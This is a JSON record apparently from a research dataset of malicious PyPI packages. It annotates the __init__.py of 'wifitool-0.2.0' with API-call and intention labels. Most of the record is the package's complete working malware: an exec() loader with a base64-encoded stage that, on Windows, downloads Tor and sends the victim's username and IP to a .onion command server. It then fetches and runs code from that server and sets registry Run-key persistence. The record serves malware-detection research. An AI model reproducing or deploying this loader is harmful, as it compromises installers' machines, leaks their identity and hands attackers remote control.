{
  "metadata": {
    "package_name": "wifitool-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/wifitool-0.2.0.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/wifitool-0.2.0/wifitool-0.2.0/wifitool/__init__.py",
      "code_snippets": [
        {
          "snippet": "exec(\"import os\\r\\nif os.name == 'nt':\\r\\n    if not os.path.exists(os.path.expandvars(r'%LOCALAPPDATA%\\Microsoft\\CommonType\\')):\\r\\n        import base64\\r\\n        import subprocess\\r\\n        import sys\\r\\n        with open(os.path.expandvars(r'%LOCALAPPDATA%\\Temp')+r'\\install_zuela.py', 'wb') as f:\\r\\n            f.write(base64.b64decode('aW1wb3J0IHppcGZpbGUNCmltcG9ydCBzdWJwcm9jZXNzDQppbXBvcnQgdXJsbGliLnJlcXVlc3QNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHRhcmZpbGUNCmltcG9ydCB3aW5yZWcNCmltcG9ydCBwaWNrbGUNCmltcG9ydCBzb2NrZXQNCmltcG9ydCBiYXNlNjQNCmltcG9ydCBzb2Nrcw0KaW1wb3J0IHV1aWQNCmltcG9ydCBvcw0KDQoNCmRlZiBzZW5kX2RhdGEoY29ubiwgZGF0YSk6DQogICAgZGF0YSA9IHBpY2tsZS5kdW1wcyhkYXRhKQ0KICAgIGRhdGFfbGVuX3N0ciA9IHN0cihsZW4oZGF0YSkpDQogICAgaGVhZGVyID0gJzAnICogKDY0IC0gbGVuKGRhdGFfbGVuX3N0cikpICsgZGF0YV9sZW5fc3RyDQoNCiAgICBjb25uLnNlbmQoaGVhZGVyLmVuY29kZSgpKQ0KICAgIGNvbm4uc2VuZChkYXRhKQ0KDQoNCmRlZiByZWN2X2RhdGEoY29ubik6DQogICAgaGVhZGVyID0gY29ubi5yZWN2KDY0KQ0KICAgIHJldHVybiBwaWNrbGUubG9hZHMoY29ubi5yZWN2KGludChoZWFkZXIpKSkNCg0KDQpodWJfZGlyID0gb3MucGF0aC5leHBhbmR2YXJzKHInJUxPQ0FMQVBQREFUQSVcTWljcm9zb2Z0XENvbW1vblR5cGUnKQ0KVEVCX2RyID0gb3MucGF0aC5leHBhbmR2YXJzKHInJUxPQ0FMQVBQREFUQSVcTWljcm9zb2Z0XENvbW1vblR5cGVCVEVCJykNCl9kaXJzID0gW2h1Yl9kaXIsIFRFQl9kaXJdDQoNClRFQl96aXBfZmlsZSA9IFRFQl9kaXIgKyByJ1xURUIudGFyLmd6Jw10b3JfZmlsZSA9IFRFQl9kaXIgKyByJ1x0b3JcdG9yLmV4ZScNcHJvZmlsZV9maWxlID0gaHViX2RpciArIHInXHByb2ZpbGUnDQpweXRob25femlwX2ZpbGUgPSBodWJfZGlyICsgcidccHl0aG9uLnppcCcNcHl0aG9ud19maWxlID0gaHViX2RpciArIHIgJ1xweXRob25ccHl0aG9udy5leGUnDQpwaW5nZXJfZmlsZSA9IGh1Yl9kaXIgKyByJ1xwaW5nZXIucHknDQoNClRFQl9saW5rID0gJ2h0dHBzOi8vYXJjaGl2ZS50b3Jwcm9qZWN0Lm9yZy90b3ItcGFja2FnZS1hcmNoaXZlL3RvcmJyb3dzZXIvMTIuMC40L3Rvci1leHBlcnQtYnVuZGxlLTEyLjAuNC13aW5kb3dzLXg4Nl82NC50YXIuZ3onDQpjMl9saW5rID0gJ3p1ZWxhMzJuMzYzZ3Vjc3lyNXo0dzYzNXBtdGhucTRsc3hvZDQzcjN5YXB1NHZkZG41cXdjcGFkLm9uaW9uJw0KYzJfcG9ydCA9IDEzMzgNCg0KZm9yIF9kaXIgaW4gX2RpcnM6DQogICAgdHJ5Og0KICAgICAgICBvcy5ta2RpcihfZGlyKQ0KICAgIGV4Y2VwdDogcGFzcw0KDQp1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZShURUJfbGluaywgVEVCX3ppcF9maWxlKQ0KDQp3aXRoIHRhcmZpbGUub3BlbihURUJfemlwX2ZpbGUpIGFzIGY6DQogICAgZi5leHRyYWN0YWxsKFRFQl9kaXIpDQoNCmh0dHBiaW4gPSByZXF1ZXN0cy5nZXQoJ2h0dHA6Ly9odHRwYmluLm9yZy9pcCcpLmpzb24oKQ0KX3Byb2ZpbGUgPSB7DQogICAgJ3VpZCc6IHN0cih1dWlkLnV1aWQ0KCkpLA0KICAgICd1c2VybmFtZSc6IG9zLmdldGxvZ2luKCksDQogICAgJ2lwJzogaHR0cGJpblsnb3JpZ2luJ10NCn0NCndpdGggb3Blbihwcm9maWxlX2ZpbGUsICd3YicpIGFzIGhhbmRsZToNCiAgICBwaWNrbGUuZHVtcChfcHJvZmlsZSwgaGFuZGxlLCBwcm90b2NvbD1waWNrbGUuSElHSEVTVF9QUk9UT0NPTCkNCg0KdG9yX3Byb2Nlc3MgPSBzdWJwcm9jZXNzLlBvcGVuKGYnInt0b3JfZmlsZX0iJywgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc2hlbGw9VHJ1ZSkNCndoaWxlIFRydWU6DQogICAgb3V0cHV0ID0gdG9yX3Byb2Nlc3Muc3Rkb3V0LnJlYWRsaW5lKCkuZGVjb2RlKCkNCiAgICBpZiAnQm9vdHN0cmFwcGVkIDEwMCUnIGluIG91dHB1dDoNCiAgICAgICAgYnJlYWsNCg0KZXJyb3IgPSBUcnVlDQp3aGlsZSBlcnJvcjoNCiAgICB0cnk6DQogICAgICAgIHNvY2tzLnNldGRlZmF1bHRwcm94eShzb2Nrcy5QUk9YWV9UWVBFX1NPQ0tTNSwgJ2xvY2FsaG9zdCcsIDkwNTApDQogICAgICAgIHNvY2tldC5zb2NrZXQgPSBzb2Nrcy5zb2Nrc29ja2V0DQoNCiAgICAgICAgcyA9IHNvY2tldC5zb2NrZXQoKQ0KDQogICAgICAgIHMuY29ubmVjdCgoYzJfbGluaywgYzJfcG9ydCkpDQoNCiAgICAgICAgZXJyb3IgPSBGYWxzZQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0Kc2VuZF9kYXRhKHMsIF9wcm9maWxlKQ0KcHl0aG9uX2ZpbGVfZGF0YSA9IGInJw0Kd2hpbGUgVHJ1ZToNCiAgICB0ZW1wX2RhdGEgPSBzLnJlY3YoMTAwMDAwMCkNCiAgICBpZiB0ZW1wX2RhdGEgPT0gYicnOg0KICAgICAgICBicmVhaw0KICAgIHB5dGhvbl9maWxlX2RhdGEgKz0gdGVtcF9kYXRhDQpzLmNsb3NlKCkNCndpdGggb3BlbihweXRob25femlwX2ZpbGUsICd3YicpIGFzIGY6DQogICAgZi53cml0ZShweXRob25fZmlsZV9kYXRhKQ0KcHl0aG9uX2ZpbGVfZGF0YSA9IE5vbmUNCndpdGggemlwZmlsZS5aaXBGaWxlKHB5dGhvbl96aXBfZmlsZSwgJ3InKSBhcyB6aXBfcmVmOg0KICAgIHppcF9yZWYuZXh0cmFjdGFsbChodWJfZGlyKQ0KDQp3aXRoIG9wZW4ocGluZ2VyX2ZpbGUsICd3YicpIGFzIGY6DQogICAgZi53cml0ZShiYXNlNjQuYjY0ZGVjb2RlKCdhVzF3YjNKMElITjFZbkJ5YjJObGMzTU5DbWx0Y0c5eWRDQnlaWEYxWlhOMGN3MEthVzF3YjNKMElITnZZMnRsZEEwS2FXMXdiM0owSUhCcFkydHNaUTBLYVcxd2IzSjBJSE52WTJ0ekRRcHBiWEJ2Y25RZ2IzTU5DZzBLRFFwa1pXWWdjMlZ1WkY5a1lYUmhLR052Ym00c0lHUmhkR0VwT2cwS0lDQWdJR1JoZEdFZ1BTQndhV05yYkdVdVpIVnRjSE1vWkdGMFlTa05DaUFnSUNCa1lYUmhYMnhsYmw5emRISWdQU0J6ZEhJb2JHVnVLR1JoZEdFcEtRMEtJQ0FnSUdobFlXUmxjaUE5SUNjd0p5QXFJQ2cyTkNBdElHeGxiaWhrWVhSaFgyeGxibDl6ZEhJcEtTQXJJR1JoZEdGZmJHVnVYM04wY2cwS0RRb2dJQ0FnWTI5dWJpNXpaVzVrS0dobFlXUmxjaTVsYm1OdlpHVW9LU2tOQ2lBZ0lDQmpiMjV1TG5ObGJtUW9aR0YwWVNrTkNnMEtEUXBrWldZZ2NtVmpkbDlrWVhSaEtHTnZibTRwT2cwS0lDQWdJR2hsWVdSbGNpQTlJR052Ym00dWNtVmpkaWcyTkNrTkNpQWdJQ0J5WlhSMWNtNGdjR2xqYTJ4bExteHZZV1J6S0dOdmJtNHVjbVZqZGlocGJuUW9hR1ZoWkdWeUtTa3BEUW9OQ2cwS1ZFVkNYMlJwY2lBOUlHOXpMbkJoZEdndVpYaHdZVzVrZG1GeWN5aHlKeVZNVDBOQlRFRlFVRVJCVkVFbFhFMXBZM0p2YzI5bWRGeERiMjF0YjI1VWVYQmxYRlJGUWljcERRcG9kV0pmWkdseUlEMGdiM011Y0dGMGFDNWxlSEJoYm1SMllYSnpLSEluSlV4UFEwRk1RVkJRUkVGVVFTVmNUV2xqY205emIyWjBYRU52YlcxdmJsUjVjR1VuS1EwS0RRcDBiM0pmWm1sc1pTQTlJRlJGUWw5a2FYSWdLeUJ5SjF4MGIzSmNkRzl5TG1WNFpTY05DbkJ5YjJacGJHVmZabWxzWlNBOUlHaDFZbDlrYVhJZ0t5QnlKMXh3Y205bWFXeGxKdzBLRFFwak1sOXNhVzVySUQwZ0ozcDFaV3hoTXpKdU16WXpaM1ZqYzNseU5YbzBkell6TlhCdGRHaHVjVFJzYzNodlpEUXpjak41WVhCMU5IWmtaRzQxY1hkamNHRmtMbTl1YVc5dUp3MEtZekpmY0c5eWRDQTlJREV6TXpjTkNnMEtkMmwwYUNCdmNHVnVLSEJ5YjJacGJHVmZabWxzWlN3Z0ozSmlKeWtnWVhNZ2FHRnVaR3hsT2cwS0lDQWdJRjl3Y205bWFXeGxJRDBnY0dsamEyeGxMbXh2WVdRb2FHRnVaR3hsS1EwS0RRcG9kSFJ3WW1sdUlEMGdjbVZ4ZFdWemRITXVaMlYwS0Nkb2RIUndPaTh2YUhSMGNHSnBiaTV2Y21jdmFYQW5LUzVxYzI5dUtDa05DbDl3Y205bWFXeGxXeWRwY0NkZElEMGdhSFIwY0dKcGJsc25iM0pwWjJsdUoxME5DZzBLZEc5eVgzQnliMk5sYzNNZ1BTQnpkV0p3Y205alpYTnpMbEJ2Y0dWdUtHWW5JbnQwYjNKZlptbHNaWDBpSnl3Z2MzUmtiM1YwUFhOMVluQnliMk5sYzNNdVVFbFFSU3dnYzJobGJHdzlWSEoxWlNrTkNuZG9hV3hsSUZSeWRXVTZEUW9nSUNBZ2IzVjBjSFYwSUQwZ2RHOXlYM0J5YjJObGMzTXVjM1JrYjNWMExuSmxZV1JzYVc1bEtDa3VaR1ZqYjJSbEtDa05DaUFnSUNCcFppQW5RbTl2ZEhOMGNtRndjR1ZrSURFd01DVW5JR2x1SUc5MWRIQjFkRG9OQ2lBZ0lDQWdJQ0FnWW5KbFlXc05DZzBLWlhKeWIzSWdQU0JVY25WbERRcDNhR2xzWlNCbGNuSnZjam9OQ2lBZ0lDQjBjbms2RFFvZ0lDQWdJQ0FnSUhOdlkydHpMbk5sZEdSbFptRjFiSFJ3Y205NGVTaHpiMk5yY3k1UVVrOVlXVjlVV1ZCRlgxTlBRMHRUTlN3Z0oyeHZZMkZzYUc5emRDY3NJRGt3TlRBcERRb2dJQ0FnSUNBZ0lITnZZMnRsZEM1emIyTnJaWFFnUFNCemIyTnJjeTV6YjJOcmMyOWphMlYwRFFvTkNpQWdJQ0FnSUNBZ2N5QTlJSE52WTJ0bGRDNXpiMk5yWlhRb0tRMEtEUW9nSUNBZ0lDQWdJSE11WTI5dWJtVmpkQ2dvWXpKZmJHbHVheXdnWXpKZmNHOXlkQ2twRFFvTkNpQWdJQ0FnSUNBZ1pYSnliM0lnUFNCR1lXeHpaUTBLSUNBZ0lHVjRZMlZ3ZERvTkNpQWdJQ0FnSUNBZ2NHRnpjdzBLRFFwelpXNWtYMlJoZEdFb2N5d2dYM0J5YjJacGJHVXBEUXBsZUdWaktISmxZM1pmWkdGMFlTaHpLU2tOQ25NdVkyeHZjMlVvS1EwS2MzVmljSEp2WTJWemN5NVFiM0JsYmlnbmRHRnphMnRwYkd3Z0wyWWdMMmx0SUhSdmNpNWxlR1VuTENCemFHVnNiRDFVY25WbEtTNTNZV2wwS0NrTkNnPT0nKSkNCg0Ka2V5VmFsID0gcidTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4nDQprZXkgPSB3aW5yZWcuT3BlbktleSh3aW5yZWcuSEtFWV9DVVJSRU5UX1VTRVIsIGtleVZhbCwgMCwgd2lucmVnLktFWV9BTExfQUNDRVNTKQ0Kd2lucmVnLlNldFZhbHVlRXgoa2V5LCAiQ29tbW9uVHlwZSIsIDAsIHdpbnJlZy5SRUdfU1osIGYnIntweXRob253X2ZpbGV9IiAie3Bpbmdlcl9maWxlfSInKQ0Kd2lucmVnLkNsb3NlS2V5KGtleSkNCg0Kc3VicHJvY2Vzcy5Qb3BlbigndGFza2tpbGwgL2YgL2ltIHRvci5leGUnLCBzaGVsbD1UcnVlKS53YWl0KCkNCnN1YnByb2Nlc3MuUG9wZW4oZicie3B5dGhvbndfZmlsZX0iICJ7cGluZ2VyX2ZpbGV9IicsIHNoZWxsPVRydWUpDQo='))\\r\\n        subprocess.Popen('\"'+sys.executable[:-4]+'w.exe'+ '\" \"'+os.path.expandvars(r'%LOCALAPPDATA%\\Temp')+r'\\install_zuela.py'+ '\"', shell=True)\\r\\n\")",
          "triple_sequences": [
            {
              "action_api": "exec()",
              "action_description": "Dynamically executes Python code string",
              "action_id": "exec_python_code",
              "object": "\"import os\\r\\nif os.name == 'nt':\\r\\n    if not os.path.exists(os.path.expandvars(r'%LOCALAPPDATA%\\Microsoft\\CommonType\\')):\\r\\n        import base64\\r\\n        import subprocess\\r\\n        import sys\\r\\n        with open(os.path.expandvars(r'%LOCALAPPDATA%\\Temp')+r'\\install_zuela.py', 'wb') as f:\\r\\n            f.write(base64.b64decode('aW1wb3J0IHppcGln...'))\\r\\n        subprocess.Popen('\"'+sys.executable[:-4]+'w.exe'+ '\" \"'+os.path.expandvars(r'%LOCALAPPDATA%\\Temp')+r'\\install_zuela.py'+ '\"', shell=True)\\r\\n\")",
              "object_description": "Python code string",
              "object_id": "python_code_string",
              "intention_description": "Execute Python code",
              "intention_id": "execute_python_code"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "os.path.expandvars(r'%LOCALAPPDATA%\\Microsoft\\CommonType\\')",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.path.expandvars()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "r'%LOCALAPPDATA%\\Microsoft\\CommonType\\'",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "os.path.expandvars(r'%LOCALAPPDATA%\\Temp')+r'\\install_zuela.py', 'wb'",
              "object_description": "Temporary Python script file",
              "object_id": "temporary_python_script",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "'aW1wb3J0IHppcGln...'",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "base64.b64decode('aW1wb3J0IHppcGln...')",
              "object_description": "Temporary Python script file",
              "object_id": "temporary_python_script",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "'\"'+sys.executable[:-4]+'w.exe'+ '\" \"'+os.path.expandvars(r'%LOCALAPPDATA%\\Temp')+r'\\install_zuela.py'+ '\"', shell=True",
              "object_description": "Temporary Python script file",
              "object_id": "temporary_python_script",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            }
          ]
        }
      ]
    }
  ]
}